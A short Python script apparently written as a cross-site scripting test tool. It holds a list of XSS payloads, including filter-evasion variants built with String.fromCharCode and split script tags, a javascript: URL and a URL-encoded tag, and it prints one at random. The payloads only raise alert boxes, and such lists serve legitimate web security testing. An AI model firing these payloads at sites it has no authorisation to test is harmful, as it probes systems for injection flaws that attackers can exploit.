import random
import string

def generate_payload():
    base_payload = "<script>alert('XSS');</script>"
    
    evasion_payload = (
        "<script>alert(String.fromCharCode(" +
        ",".join(str(ord(c)) for c in "XSS") + "));</script>"
    )
    
    evasion_payload_2 = (
        '<scr' + 'ipt>alert(String.f' + 'romCharCode(88,83,83))</scr' + 'ipt>'
    )
    
    payloads = [
        base_payload,
        evasion_payload,
        evasion_payload_2,
        "'';!--\"<XSS>=&{()};",
        "javascript:alert(1)",
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"
    ]
    
    return random.choice(payloads)

if __name__ == "__main__":
    print(generate_payload())
